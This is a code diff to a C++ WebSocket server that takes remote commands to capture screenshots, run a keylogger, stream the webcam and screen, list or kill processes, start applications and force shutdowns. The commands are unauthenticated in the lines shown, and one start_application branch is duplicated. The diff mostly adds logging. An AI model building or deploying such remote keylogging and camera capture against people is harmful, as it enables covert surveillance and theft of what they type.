@@ -31,7 +31,6 @@
 
 
 void session(tcp::socket socket) {
-    // SystemMonitor sysMonitor;
     auto sysMonitor = std::make_shared<SystemMonitor>();
     try {
         auto ws_ptr = std::make_shared<websocket::stream<tcp::socket>>(std::move(socket));
@@ -74,51 +73,87 @@ void session(tcp::socket socket) {
             if (data["command"] == "screenshot") {
                 sendMsg(*ws_ptr, "text", "Info", "Capturing screenshot...");
                 captureScreenshot(*ws_ptr);
+                std::cerr << "Capturing screenshot..." << std::endl;
             }
             else if (data["command"] == "processes") {
                 sendMsg(*ws_ptr, "text", "Info", "Listing running processes...");
                 list_processes(*ws_ptr);
+                std::cerr << "Listing running processes..." << std::endl;
             }
             else if (data["command"] == "applications") {
                 sendMsg(*ws_ptr, "text", "Info", "Listing running applications...");
                 list_applications(*ws_ptr);
+                std::cerr << "Listing running applications..." << std::endl;
+            }
+            else if (data["command"] == "start_application") {
+                std::string appName = data["name"];
+                sendMsg(*ws_ptr, "text", "Info", "Starting application: " + appName);
+                start_application_exec(appName); 
+                std::cerr << "Starting application: " << appName << std::endl;
             }
             else if (data["command"] == "start_keylogger") {
                 sendMsg(*ws_ptr, "text", "Info", "Keylogger started.");
                 key_log_start(ws_ptr);  
+                std::cerr << "Keylogger started." << std::endl;
             }
             else if (data["command"] == "stop_keylogger") {
                 key_log_stop();
                 sendMsg(*ws_ptr, "text", "Info", "Keylogger stopped.");
+                std::cerr << "Keylogger stopped." << std::endl;
             }
             else if (data["command"] == "shutdown") {
                 sendMsg(*ws_ptr, "text", "Info", "Shutting down the system...");
                 system("shutdown /s /t 0 /f");
+                std::cerr << "Shutting down the system..." << std::endl;
             }
             else if (data["command"] == "restart") {
                 sendMsg(*ws_ptr, "text", "Info", "Restarting the system...");
                 system("shutdown /r /t 0 /f");
+                std::cerr << "Restarting the system..." << std::endl;
             }
             else if (data["command"] == "start_camera") {
                 sendMsg(*ws_ptr, "text", "Info", "Camera started.");
                 startCamera(ws_ptr);
                 sendMsg(*ws_ptr, "text", "Info", "Showing video...");
+                std::cerr << "Camera started." << std::endl;
             }
             else if (data["command"] == "stop_camera") {
                 stopCamera();
                 sendMsg(*ws_ptr, "text", "Info", "Camera stopped.");
+                std::cerr << "Camera stopped." << std::endl;
             }
             else if (data["command"] == "start_screen") {
                 sendMsg(*ws_ptr, "text", "Info", "Screen recording started.");
                 startScreen(ws_ptr);
                 sendMsg(*ws_ptr, "text", "Info", "Recording screen...");
+                std::cerr << "Screen recording started." << std::endl;
             }
             else if (data["command"] == "stop_screen") {
                 sendMsg(*ws_ptr, "text", "Info", "Screen recording stopped.");
                 stopScreen();
+                std::cerr << "Screen recording stopped." << std::endl;
+            }
+            else if (data["command"] == "start_application") {
+                if (data.contains("name")) {
+                    std::string appName = data["name"];
+                    sendMsg(*ws_ptr, "text", "Info", "Starting app: " + appName);
+                    start_application_exec(appName);
+                    std::cerr << "Starting application: " << appName << std::endl;
+                }
+            }
+            else if (data["command"] == "stop_application") {
+                if (data.contains("exe_name")) {
+                    std::string exeName = data["exe_name"];
+                    stop_application_by_name(exeName, *ws_ptr);
+                    std::cerr << "Stopping application: " << exeName << std::endl;
+                }
             }
             else if (data["command"] == "stop_process") {
-                handle_kill_process(data, *ws_ptr);
+                if (data.contains("pid")) {
+                    DWORD pid = data["pid"];
+                    stop_application_exec(pid, *ws_ptr);
+                    std::cerr << "Stopping process PID: " << pid << std::endl;
+                }
             }
             else {
                 sendMsg(*ws_ptr, "text", "Info", "Unknown command: " + msg);
@@ -127,11 +162,13 @@ void session(tcp::socket socket) {
     }
     catch (std::exception& e) {
         file_logger->error("Session error: {}", e.what());
+        std::cerr << "Session error: " << e.what() << std::endl;
         key_log_stop();
         stopCamera();
         stopScreen();
     } catch (...) {
         file_logger->error("Session unknown error");
+        std::cerr << "Session error: unknown error" << std::endl;
         key_log_stop();
         stopCamera();
         stopScreen();
@@ -144,6 +181,7 @@ int main() {
         tcp::acceptor acceptor(ioc, {tcp::v4(), 8080});
         spdlog::flush_on(spdlog::level::info);
         file_logger->info("Server running at ws://localhost:8080");
+        std::cout << "Server running at ws://localhost:8080" << std::endl;
         std::thread(announce_once).detach();
 
         for (;;) {
